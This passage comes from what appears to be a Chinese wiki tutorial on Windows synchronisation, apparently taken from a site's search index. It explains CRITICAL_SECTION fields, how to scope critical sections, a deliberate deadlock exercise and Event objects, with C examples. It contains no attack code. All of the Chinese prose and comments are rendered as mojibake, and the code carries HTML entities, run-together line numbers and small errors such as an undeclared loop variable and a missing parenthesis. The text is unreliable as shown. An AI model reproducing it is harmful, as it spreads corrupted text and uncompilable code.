é€šå¸¸åˆå§‹åŒ–ä¸º-1ã€‚å½“è¿™ä¸ªå€¼ç­‰äºæˆ–å¤§äº0æ—¶ï¼Œè¡¨ç¤ºè¯¥ä¸´ç•ŒåŒºå·²è¢«æŸä¸ªçº¿ç¨‹å ç”¨ RecursionCountï¼šè®°å½•å½“å‰å ç”¨ä¸´ç•ŒåŒºçš„çº¿ç¨‹å·²ç»è·å¾—è¯¥ä¸´ç•ŒåŒºçš„æ¬¡æ•°ã€‚ å¦‚æœåŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è°ƒç”¨ EnterCriticalSectionï¼Œè¿™ä¸ªè®¡æ•°å™¨ä¼šé€’å¢ã€‚å®ƒå…è®¸åŒä¸€ä¸ªçº¿ç¨‹åœ¨å·²ç»æŒæœ‰ä¸´ç•ŒåŒºçš„æƒ…å†µä¸‹é€’å½’åœ°è¿›å…¥ä¸´ç•ŒåŒºï¼Œè€Œä¸ä¼šå¯¼è‡´æ­»é”ã€‚ ç­‰å¾…è·å¾—ä¸´ç•ŒåŒºçš„çº¿ç¨‹æ•°ï¼šLockCount -ï¼ˆRecursionCount-1ï¼‰ OwningThreadï¼šå½“å‰æŒæœ‰ä¸´ç•ŒåŒºçš„çº¿ç¨‹çš„æ ‡è¯†ç¬¦ã€‚ è¿™ä¸ªæ ‡è¯†ç¬¦ä¸ GetCurrentThreadId å‡½æ•°è¿”å›çš„çº¿ç¨‹ ID æ˜¯ç›¸åŒçš„ã€‚ ä¾‹ VCç‰ˆVSç‰ˆ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadNum = (int)(size_t)lpParameter; for (int x = 0; x &lt; 5; x++) &#123; EnterCriticalSection(&amp;cs); Sleep(100); printf(&quot;Thread %d: LockCount=%x RecursionCount=%x OwningThread=%x &quot;, threadNum, cs.LockCount, cs.RecursionCount, cs.OwningThread); LeaveCriticalSection(&amp;cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; InitializeCriticalSection(&amp;cs); printf(&quot;Main Thread:%x %x %x &quot;, cs.LockCount, cs.RecursionCount, cs.OwningThread); // åˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹ä¼ å…¥è‡ªå·±çš„ç¼–å· HANDLE threads[4]; for (int i = 0; i &lt; 4; i++) &#123; threads[i] = CreateThread(NULL, 0, ThreadProc, (LPVOID)(size_t)(i + 1), 0, NULL); &#125; // ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ WaitForMultipleObjects(4, threads, TRUE, INFINITE); // å…³é—­çº¿ç¨‹å¥æŸ„ for (i = 0; i &lt; 4; i++) &#123; CloseHandle(threads[i]); &#125; DeleteCriticalSection(&amp;cs); return 0;&#125; çº¿ç¨‹å‡½æ•°ä¸­æ²¡æœ‰é€’å½’ï¼ŒLockCount -ï¼ˆRecursionCount-1ï¼‰ï¼Œ1-1æ˜¯0ï¼ŒLockCountå°±è¡¨ç¤ºç­‰å¾…çº¿ç¨‹æ•°ï¼› 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadNum = (int)(size_t)lpParameter; for (int x = 0; x &lt; 5; x++) &#123; EnterCriticalSection(&amp;cs); Sleep(100); printf(&quot;Thread %d: LockCount=%ld RecursionCount=%ld OwningThread=%x &quot;, threadNum, (long)cs.LockCount, (long)cs.RecursionCount, cs.OwningThread); LeaveCriticalSection(&amp;cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; InitializeCriticalSection(&amp;cs); printf(&quot;Main Thread:%ld %ld %x &quot;, (long)cs.LockCount, (long)cs.RecursionCount, cs.OwningThread); // åˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹ä¼ å…¥è‡ªå·±çš„ç¼–å· HANDLE threads[4]; for (int i = 0; i &lt; 4; i++) &#123; threads[i] = CreateThread(NULL, 0, ThreadProc, (LPVOID)(size_t)(i + 1), 0, NULL); &#125; // ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ WaitForMultipleObjects(4, threads, TRUE, INFINITE); // å…³é—­çº¿ç¨‹å¥æŸ„ for (int i = 0; i &lt; 4; i++) &#123; CloseHandle(threads[i]); &#125; DeleteCriticalSection(&amp;cs); return 0;&#125; ä¸æ¸…æ¥šä¸ºå•¥VSä¸‹æ­¥é•¿ä¼šä¸ä¸€æ ·ã€‚markï¼Œåé¢æœ‰ç©ºå†ç ”ç©¶ å°è¯•è¿‡ç¨‹ï¼šODä¸­æ­¥è¿›InitializeCriticalSectionï¼Œä¼šè·Ÿè¿›ntdllä¸­ï¼Œæ²¡æœ‰è¿›å†…æ ¸ï¼Œåœ¨ntdllä¸­å¤„ç†å®Œå°±å‡ºæ¥äº†ã€‚ä¼°è®¡æ˜¯xpå’Œwin10ç³»ç»Ÿä¸åŒï¼ŒInitializeCriticalSectionï¼ŒEnterCriticalSectionï¼ŒLeaveCriticalSectionå‡½æ•°å…·ä½“å®ç°å˜äº†ã€‚å¯¹æ¯”ä¸‹ä¸¤ä¸ªç³»ç»Ÿä¸­ntdllçš„ä»£ç å®ç°ã€‚ å¦å¤–ï¼Œå› ä¸ºä¸´ç•ŒåŒºä¸æ˜¯å†…æ ¸å¯¹è±¡ï¼Œ=&gt;æ‰€ä»¥ä¸ä¼šè¿›å†…æ ¸ã€‚ å¦‚ä½•åˆç†ä½¿ç”¨ä¸´ç•ŒåŒº åœºæ™¯1 çº¿ç¨‹A12345678910111213DWORD WINAPI çº¿ç¨‹A(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); while (g_nIndex &lt; MAX_TIMES) &#123; //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ &#125; LeaveCriticalSection(&amp;cs); return 0;&#125; çº¿ç¨‹B12345678910111213DWORD WINAPI çº¿ç¨‹B(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); while (g_nIndex &lt; MAX_TIMES) &#123; //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ &#125; LeaveCriticalSection(&amp;cs); return 0;&#125; åˆ†æ ä¸Šé¢çš„EnterCriticalSectionå’ŒLeaveCriticalSectionå°†å¤§é‡éä¸´ç•ŒåŒºä»£ç æ”¾åœ¨ä¸´ç•ŒåŒºå†…ï¼Œè€Œå®é™…ä¸Šçº¿ç¨‹Açš„whileä¸­å¯èƒ½åªæœ‰1%çš„ä»£ç æ˜¯åœ¨æ“ä½œä¸´ç•Œèµ„æºã€‚è¿™ä¸ªåœºæ™¯è¿˜æ¯”è¾ƒç‰¹æ®Šï¼ŒEnterCriticalSectionæ”¾åœ¨æ•´ä¸ªçº¿ç¨‹å‡½æ•°å¼€å¤´ï¼ŒLeaveCriticalSectionæ”¾åœ¨å‡½æ•°ç»“å°¾ã€‚å‡è®¾çº¿ç¨‹Aè¿›å…¥ä¸´ç•ŒåŒºåï¼Œçº¿ç¨‹Bæ²¡æ³•è¿›å…¥ï¼Œåªèƒ½ç­‰å¾…çº¿ç¨‹Aç¦»å¼€ä¸´ç•ŒåŒºåæ‰èƒ½è¿›å…¥ã€‚ç¨‹åºè¿™æ ·å†™ï¼Œä¼šä½¿å¾—åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œï¼Œæ— æ³•å‘æŒ¥å‡ºå¤šçº¿ç¨‹çš„ä¼˜åŠ¿ï¼Œç¨‹åºæ•ˆç‡ä½ã€‚ è§£å†³åŠæ³• å°†Enterå’ŒLeaveçš„ä»£ç ç´§æŒ¨ç€è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç çš„å‰å çº¿ç¨‹A123456789101112DWORD WINAPI çº¿ç¨‹A(PVOID lpParameter)&#123; while (g_nIndex &lt; MAX_TIMES) &#123; EnterCriticalSection(&amp;cs); //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ LeaveCriticalSection(&amp;cs); &#125; return 0;&#125; çº¿ç¨‹B123456789101112DWORD WINAPI çº¿ç¨‹B(PVOID lpParameter)&#123; while (g_nIndex &lt; MAX_TIMES) &#123; EnterCriticalSection(&amp;cs); //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ LeaveCriticalSection(&amp;cs); &#125; return 0;&#125; åœºæ™¯2 çº¿ç¨‹A123456789101112DWORD WINAPI çº¿ç¨‹A(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); //ä»£ç xxxxxx //ä»£ç xxxxxx //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ //ä»£ç xxxxxx //ä»£ç xxxxxx LeaveCriticalSection(&amp;cs);&#125; çº¿ç¨‹B123456789101112DWORD WINAPI çº¿ç¨‹B(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); //ä»£ç xxxxxx //ä»£ç xxxxxx //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ //ä»£ç xxxxxx //ä»£ç xxxxxx LeaveCriticalSection(&amp;cs);&#125; åˆ†æ å’Œåœºæ™¯1ä¸€æ ·ï¼Œä¸´ç•ŒåŒºä¸­åŒ…å«äº†å¤šä½™çš„ä»£ç  è§£å†³åŠæ³• å°†ä¸´ç•ŒåŒºåªåŒ…è£¹ä½å®é™…éœ€è¦ä¿æŠ¤çš„ä¸´ç•Œèµ„æºæ“ä½œ çº¿ç¨‹A12345678910111213DWORD WINAPI çº¿ç¨‹A(PVOID lpParameter)&#123; //ä»£ç xxxxxx //ä»£ç xxxxxx EnterCriticalSection(&amp;cs); //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ LeaveCriticalSection(&amp;cs); //ä»£ç xxxxxx //ä»£ç xxxxxx &#125; çº¿ç¨‹B12345678910111213DWORD WINAPI çº¿ç¨‹BPVOID lpParameter)&#123; //ä»£ç xxxxxx //ä»£ç xxxxxx EnterCriticalSection(&amp;cs); //...å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ LeaveCriticalSection(&amp;cs); //ä»£ç xxxxxx //ä»£ç xxxxxx &#125; åœºæ™¯1å’Œåœºæ™¯2å°ç»“ï¼šä¸´ç•ŒåŒºçš„è¿›å…¥å’Œç¦»å¼€åº”ç´§æŒ¨ç€è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç å‰åã€‚å¦‚æœå°†å¤šä½™çš„ä»£ç ä¹ŸåŒ…å«åœ¨ä¸´ç•ŒåŒºå†…ï¼Œå°½ç®¡æ§åˆ¶äº†å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®å†²çªï¼Œä½†ä¼šé™ä½ç¨‹åºæ•ˆç‡ã€‚ åœºæ™¯3 çº¿ç¨‹A123456789101112131415DWORD WINAPI çº¿ç¨‹A(PVOID lpParameter)&#123; //ä»£ç xxxxxx //ä»£ç xxxxxx EnterCriticalSection(&amp;cs); //å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ LeaveCriticalSection(&amp;cs); //ä»£ç xxxxxx //ä»£ç xxxxxx return 0;&#125; çº¿ç¨‹B12345678910111213DWORD WINAPI çº¿ç¨‹B(PVOID lpParameter)&#123; //ä»£ç xxxxxx //ä»£ç xxxxxx //å¯¹ä¸´ç•Œèµ„æºXçš„æ“ä½œ //ä»£ç xxxxxx //ä»£ç xxxxxx return 0;&#125; åˆ†æ çº¿ç¨‹Bå¯ä»¥ç›´æ¥è¿›å…¥ä¸´ç•ŒåŒºä¸å—é™åˆ¶ã€‚ è§£å†³åŠæ³• æ‰€æœ‰è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç éƒ½éœ€è¦åšæ§åˆ¶ã€‚ åº”è¯¥æœ‰å‡ ä¸ªä¸´ç•ŒåŒº 1234int X; //ä¸´ç•Œèµ„æºXint Y; //ä¸´ç•Œèµ„æºYint Z; //ä¸´ç•Œèµ„æºZCRITICAL_SECTION g_cs; çº¿ç¨‹1123456789DWORD WINAPI ThreadFunc1(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // ä½¿ç”¨X // ä½¿ç”¨Y LeaveCriticalSection(&amp;g_cs); return 0;&#125; çº¿ç¨‹212345678DWORD WINAPI ThreadFunc2(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // ä½¿ç”¨X // ä½¿ç”¨Z LeaveCriticalSection(&amp;g_cs); return 0;&#125; çº¿ç¨‹3123456789DWORD WINAPI ThreadFunc3(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // ä½¿ç”¨Y // ä½¿ç”¨X LeaveCriticalSection(&amp;g_cs); return 0;&#125; åˆ†æ åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½ä½¿ç”¨åŒä¸€ä¸ªä¸´ç•ŒåŒºg_csã€‚åœ¨çº¿ç¨‹1ä¸­ï¼Œå°†å¯¹Xå’ŒYçš„è®¿é—®éƒ½åŒ…å«åœ¨ä¸´ç•ŒåŒºä¸­ï¼Œè¿™ä¼šå¯¼è‡´çº¿ç¨‹1åœ¨è®¿é—®Xæ—¶ï¼Œé˜»å¡å…¶ä»–çº¿ç¨‹è®¿é—®Yã€‚å¦‚æœä¸´ç•Œèµ„æºXå’Œä¸´ç•Œèµ„æºYä½¿ç”¨æ—¶ä¸éœ€è¦æ†ç»‘èµ·æ¥ä¸€å—ä½¿ç”¨ï¼Œé‚£ä¹ˆå½“çº¿ç¨‹1è®¿é—®ä¸´ç•Œèµ„æºXæ—¶ï¼Œå¯ä»¥è®©çº¿ç¨‹3è®¿é—®ä¸´ç•Œèµ„æºYã€‚å› æ­¤ï¼Œåº”è¯¥ä¸ºæ¯ä¸ªä¸´ç•Œèµ„æºè®¾ç«‹å•ç‹¬çš„ä¸´ç•ŒåŒºã€‚ è§£å†³æ–¹æ¡ˆ ä¸´ç•Œèµ„æºå¦‚æœä¸éœ€è¦æ†ç»‘ä½¿ç”¨ï¼Œé‚£è®¾ç«‹ä¸´ç•ŒåŒºæ—¶ï¼Œè¦ä¸ºæ¯ä¸ªä¸´ç•Œèµ„æºå•ç‹¬è®¾ç«‹ä¸´ç•ŒåŒºï¼Œå³æœ‰å‡ ä¸ªä¸´ç•Œèµ„æºï¼Œå°±è®¾ç«‹å‡ ä¸ªä¸´ç•ŒåŒºã€‚ 123456int X;int Y;int Z;CRITICAL_SECTION g_csX; CRITICAL_SECTION g_csY; CRITICAL_SECTION g_csZ; çº¿ç¨‹1123456789101112DWORD WINAPI ThreadFunc1(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csX); // ä½¿ç”¨X LeaveCriticalSection(&amp;g_csX); EnterCriticalSection(&amp;g_csY); // ä½¿ç”¨Y LeaveCriticalSection(&amp;g_csY); return 0;&#125; çº¿ç¨‹2123456789101112DWORD WINAPI ThreadFunc2(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csX); // ä½¿ç”¨X LeaveCriticalSection(&amp;g_csX); EnterCriticalSection(&amp;g_csZ); // ä½¿ç”¨Z LeaveCriticalSection(&amp;g_csZ); return 0;&#125; çº¿ç¨‹3123456789101112DWORD WINAPI ThreadFunc3(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csY); // ä½¿ç”¨Y LeaveCriticalSection(&amp;g_csY); EnterCriticalSection(&amp;g_csX); // ä½¿ç”¨X LeaveCriticalSection(&amp;g_csX); return 0;&#125; ç»ƒä¹  é¢˜ç›®ï¼šä½¿ç”¨ä¸´ç•ŒåŒºå®ç°ä¸€ä¸ªæ­»é”ç¨‹åº è¿‡ç¨‹æ­»é”ï¼ˆDeadlockï¼‰ï¼šä¸¤ä¸ªä»¥ä¸Šè¿ç®—å•å…ƒï¼ŒåŒæ–¹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹å·²æŒæœ‰çš„èµ„æºï¼Œåœ¨æ²¡æœ‰å¤–åŠ›çš„ä½œç”¨ä¸‹ï¼Œè¿™äº›çº¿ç¨‹ä¼šä¸€ç›´ç›¸äº’ç­‰å¾…ï¼Œç¨‹åºæ²¡æ³•åŠç»§ç»­è¿è¡Œï¼Œè¿™ç§æƒ…å†µå°±æ˜¯å‘ç”Ÿäº†æ­»é”ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨ä¸´ç•ŒåŒºæ¥æ¨¡æ‹Ÿçº¿ç¨‹æŒæœ‰å’Œæƒ³è¦è·å¾—çš„â€œèµ„æºâ€ä»£ç æ¨¡æ‹Ÿçº¿ç¨‹Aå·²è¿›å…¥ä¸´ç•ŒåŒºcs1ï¼Œå°è¯•è¿›å…¥cs2çº¿ç¨‹Bå·²è¿›å…¥ä¸´ç•ŒåŒºcs2ï¼Œå°è¯•è¿›å…¥cs1çº¿ç¨‹Aåœ¨ç­‰å¾…çº¿ç¨‹Bé‡Šæ”¾cs2ï¼Œçº¿ç¨‹Båœ¨ç­‰å¾…çº¿ç¨‹Aé‡Šæ”¾cs1ï¼Œçº¿ç¨‹Aå’Œçº¿ç¨‹Bäº’ç›¸ç­‰å¾…ï¼Œæ— æ³•ç»§ç»­è¿è¡Œï¼Œä»è€Œäº§ç”Ÿæ­»é”12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs1, cs2;DWORD WINAPI ThreadFunc1(LPVOID lpParam) &#123; printf(&quot;Thread 1: Trying to enter cs1 &quot;); EnterCriticalSection(&amp;cs1); printf(&quot;Thread 1: Entered cs1 &quot;); // Simulate some work Sleep(1000); printf(&quot;Thread 1: Trying to enter cs2 &quot;); EnterCriticalSection(&amp;cs2); printf(&quot;Thread 1: Entered cs2 &quot;); LeaveCriticalSection(&amp;cs2); LeaveCriticalSection(&amp;cs1); return 0;&#125;DWORD WINAPI ThreadFunc2(LPVOID lpParam) &#123; printf(&quot;Thread 2: Trying to enter cs2 &quot;); EnterCriticalSection(&amp;cs2); printf(&quot;Thread 2: Entered cs2 &quot;); // Simulate some work Sleep(1000); printf(&quot;Thread 2: Trying to enter cs1 &quot;); EnterCriticalSection(&amp;cs1); printf(&quot;Thread 2: Entered cs1 &quot;); LeaveCriticalSection(&amp;cs1); LeaveCriticalSection(&amp;cs2); return 0;&#125;int main() &#123; HANDLE hThread1, hThread2; // Initialize the critical sections InitializeCriticalSection(&amp;cs1); InitializeCriticalSection(&amp;cs2); // Create two threads hThread1 = CreateThread(NULL, 0, ThreadFunc1, NULL, 0, NULL); hThread2 = CreateThread(NULL, 0, ThreadFunc2, NULL, 0, NULL); // Wait for both threads to complete WaitForSingleObject(hThread1, INFINITE); WaitForSingleObject(hThread2, INFINITE); // Clean up DeleteCriticalSection(&amp;cs1); DeleteCriticalSection(&amp;cs2); CloseHandle(hThread1); CloseHandle(hThread2); return 0;&#125;"},{"title":"äº‹ä»¶ï¼ˆEventï¼‰","path":"/wiki/Windows_API/äº‹ä»¶.html","content":"Windows Eventå¯¹è±¡ CreateEvent ä½¿ç”¨CreateEventåˆ›å»ºäº‹ä»¶å¯¹è±¡ï¼ˆEvent Objectï¼‰ã€‚äº‹ä»¶å¯¹è±¡æœ‰ä¸¤ç§çŠ¶æ€ï¼š signaled stateï¼šæœ‰ä¿¡å·/æˆä¿¡çŠ¶æ€ non signaled stateï¼šæ— ä¿¡å·/æ— çŠ¶æ€ 123456HANDLE CreateEventA( // è¿”å›äº‹ä»¶å¯¹è±¡çš„å¥æŸ„ [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, // SD å®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ [in] BOOL bManualReset, // reset type é‡ç½®ç±»å‹ [in] BOOL bInitialState, // initial state åˆå§‹åŒ–çŠ¶æ€ [in, optional] LPCSTR lpName // event object name äº‹ä»¶å¯¹è±¡å); lpEventAttributesï¼šSDï¼Œå®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºNULL bManualResetï¼šé‡ç½®ç±»å‹ï¼ŒæŒ‡ç¤ºäº‹ä»¶å¯¹è±¡æ˜¯æ‰‹åŠ¨é‡ç½®ï¼ˆmanual-reset event objectï¼‰è¿˜æ˜¯è‡ªåŠ¨é‡ç½®ï¼ˆauto-reset event objectï¼‰ TRUEï¼šæ‰‹åŠ¨é‡ç½®ã€‚éœ€è¦æ‰‹åŠ¨è°ƒç”¨RestEventå‡½æ•°å°†Eventå¯¹è±¡é‡ç½®ä¸ºæ— ä¿¡å·çŠ¶æ€ FALSEï¼šè‡ªåŠ¨é‡ç½®ã€‚Eventå¯¹è±¡å—ä¿¡åä¼šè‡ªåŠ¨é‡ç½®ä¸ºæ— ä¿¡å·çŠ¶æ€ bInitialStateï¼šEventäº‹ä»¶å¯¹è±¡è¢«åˆ›å»ºåçš„åˆå§‹çŠ¶æ€æ˜¯æœ‰ä¿¡å·è¿˜æ˜¯æ— ä¿¡å·çŠ¶æ€ TRUEï¼šæœ‰ä¿¡å·ï¼Œsignaled FALSEï¼šæ— ä¿¡å·ï¼Œnon signaled lpNameï¼šEventå¯¹è±¡çš„åç§° SetEvent SetEventå°†æ— ä¿¡å·çš„Eventå¯¹è±¡è®¾ç½®ï¼ˆSetï¼‰ä¸ºæˆä¿¡çŠ¶æ€ 1BOOL SetEvent( HANDLE hEvent // handle to event); ReSetEvent ReSetEventå°†æœ‰ä¿¡å·çš„Eventå¯¹è±¡é‡ç½®ï¼ˆReSetï¼‰ä¸ºæ— ä¿¡å·çŠ¶æ€ 1BOOL ResetEvent( HANDLE hEvent // handle to event); Eventå¯¹è±¡çš„â€œé€šçŸ¥â€åŠŸèƒ½ å¯ä»¥å‘ç°ï¼ŒEventå¯¹è±¡çš„çŠ¶æ€å¯ä»¥é€šè¿‡æ‰‹åŠ¨è®¾ç½®æˆ–è‡ªåŠ¨é‡ç½®æ¥é€šçŸ¥å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·å°±èƒ½è¿›è¡Œâ€œé€šä¿¡â€ï¼Œå°±èƒ½ç”¨äºçº¿ç¨‹çš„åŒæ­¥æ§åˆ¶ã€‚ ä¾‹ è¯¥ä»£ç åœ¨mainå‡½æ•°ä¸­åˆ›å»ºäº†ä¸‰ä¸ªçº¿ç¨‹ï¼šä¸€ä¸ªçº¿ç¨‹è´Ÿè´£ç»™å˜é‡èµ‹å€¼ï¼Œå¦å¤–ä¸¤ä¸ªçº¿ç¨‹è´Ÿè´£è¯»å–è¯¥å˜é‡çš„å€¼ã€‚åœ¨èµ‹å€¼çº¿ç¨‹å®Œæˆèµ‹å€¼æ“ä½œåï¼Œå…¶ä½™ä¸¤ä¸ªè¯»å–çº¿ç¨‹æ‰èƒ½å¼€å§‹è¯»ã€‚è¿™é‡Œé€šè¿‡Eventå¯¹è±¡æ¥é€šçŸ¥è¯»å–çº¿ç¨‹è¯»å–ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;HANDLE g_hEvent;int g_sharedResource;DWORD WINAPI WriteThreadProc(LPVOID lpParameter)&#123; // æ¨¡æ‹Ÿä¸€äº›å†™å…¥æ“ä½œ Sleep(1000); // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ g_sharedResource = 42; // å†™å…¥æ“ä½œ printf(&quot;WriteThread: Shared resource updated to %d &quot;, g_sharedResource); // è®¾ç½®äº‹ä»¶å¯¹è±¡ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œé€šçŸ¥å…¶ä»–çº¿ç¨‹ SetEvent(g_hEvent); return 0;&#125;DWORD WINAPI ReadThreadProc(LPVOID lpParameter)&#123; int threadNum = *(int*)lpParameter; // ç­‰å¾…äº‹ä»¶å¯¹è±¡è¢«è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ WaitForSingleObject(g_hEvent, INFINITE); printf(&quot;ReadThread_%d: Shared resource value is %d &quot;, threadNum, g_sharedResource); return 0;&#125;int main()&#123; // åˆ›å»ºæ‰‹åŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡ g_hEvent = CreateEvent( NULL, // ä½¿ç”¨é»˜è®¤å®‰å…¨å±æ€§ TRUE, // æ‰‹åŠ¨é‡ç½® FALSE, // åˆå§‹ä¸ºæ— ä¿¡å·çŠ¶æ€ NULL // NULL åŒ¿åå¯¹è±¡ ); if (g_hEvent == NULL) &#123; printf(&quot;CreateEvent failed (%d) &quot;, GetLastError()); return 1; &#125; HANDLE hThreads[3]; int threadNums[2] = &#123; 1, 2 &#125;; // åˆ›å»ºå†™å…¥çº¿ç¨‹ hThreads[0] = CreateThread(NULL, 0, WriteThreadProc, NULL, 0, NULL); if (hThreads[0] == NULL) &#123; printf(&quot;CreateThread for WriteThread failed (%d) &quot;, GetLastError()); CloseHandle(g_hEvent); return 1; &#125; // åˆ›å»ºè¯»å–çº¿ç¨‹ for (int i = 0; i &lt; 2; ++i) &#123; hThreads[i + 1] = CreateThread(NULL, 0, ReadThreadProc, &amp;threadNums[i], 0, NULL); if (hThreads[i + 1] == NULL) &#123; printf(&quot;CreateThread for ReadThread_%d failed (%d) &quot;, i + 1, GetLastError()); CloseHandle(g_hEvent); return 1; &#125; &#125; // ç­‰å¾…æ‰€æœ‰çº¿ç¨‹æ‰§è¡Œå®Œæ¯• WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); // å…³é—­å¥æŸ„ for (int i = 0; i &lt; 3; ++i) &#123; CloseHandle(hThreads[i]); &#125; CloseHandle(g_hEvent); return 0;&#125; Eventå¯¹è±¡åœ¨ä¸»å‡½æ•°ä¸­è¢«åˆ›å»ºå‡ºæ¥ï¼Œæ‰‹åŠ¨é‡ç½®ç±»å‹ï¼Œåˆå§‹ä¸ºæ— ä¿¡å·çŠ¶æ€ã€‚éšååˆ›å»ºäº†1ä¸ªå†™å…¥çº¿ç¨‹ï¼Œ2ä¸ªè¯»å–çº¿ç¨‹ã€‚å†™å…¥çº¿ç¨‹å†™å®Œä¸´ç•Œèµ„æºåï¼ŒSetEventå°†Eventå¯¹è±¡è®¾ç½®ä¸ºæœ‰ä¿¡å·åã€‚2ä¸ªè¯»å–çº¿ç¨‹æ‰èƒ½æ‰§è¡Œï¼Œè€Œä¸ä¼šè¢«é˜»å¡ã€‚å› ä¸ºæ˜¯æ‰‹åŠ¨é‡ç½®ç±»å‹ï¼ŒæŸä¸ªè¯»å–çº¿ç¨‹å¾—åˆ°æœ‰ä¿¡å·çš„Eventå¯¹è±¡åï¼ŒEventå¯¹è±¡ä»æ˜¯æœ‰ä¿¡å·ï¼Œäºæ˜¯å½“CPUåˆ‡åˆ°ç¬¬äºŒä¸ªè¯»å–çº¿ç¨‹æ—¶ä¹Ÿèƒ½æ‰§è¡Œã€‚ è¾“å‡º123WriteThread: Shared resource updated to 42ReadThread_1: Shared resource value is 42ReadThread_2: Shared resource value is 42 ä»è¿™ä¸ªä¾‹å­å¯ä»¥çœ‹åˆ°Eventå¯¹è±¡çš„ä¸¤ä¸ªç‰¹ç‚¹ï¼š æ²¡æœ‰ownerçš„è¯´æ³•ã€‚Mutexå¯¹è±¡æœ‰æ‹¥æœ‰è€…çš„è¯´æ³•ï¼Œè€ŒEventå¯¹è±¡æ²¡æœ‰ã€‚ Eventå¯¹è±¡å¦‚æœæ˜¯æ‰‹åŠ¨é‡ç½®ç±»å‹ï¼Œä¸€æ—¦æ‰‹åŠ¨è°ƒç”¨SetEventç½®ä¸ºæœ‰ä¿¡å·åï¼Œå°±ä¸€ç›´æ˜¯æœ‰ä¿¡å·ã€‚æŸä¸ªçº¿ç¨‹ä½¿ç”¨WaitForSingleObjectç­‰å¾…Eventå¯¹è±¡æœ‰ä¿¡å·åï¼Œå®ƒä¸ä¼šå°†è¿™ä¸ªEventå¯¹è±¡ä¿®æ”¹ä¸ºæ— ä¿¡å·ã€‚æ¢å¥è¯è¯´ï¼ŒEventå¯¹è±¡æœ‰ä¿¡å·åï¼Œè¿™ä¸ªä¿¡å·å¯ä»¥è¢«å¤šä¸ªçº¿ç¨‹æ£€æµ‹åˆ°ï¼Œå³ä½¿ç”¨Eventå¯¹è±¡å¯ä»¥åŒæ—¶å”¤é†’å¤šä¸ªç­‰å¾…çš„çº¿ç¨‹ã€‚ ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€… åœ¨ä¹‹å‰å­¦ä¹ 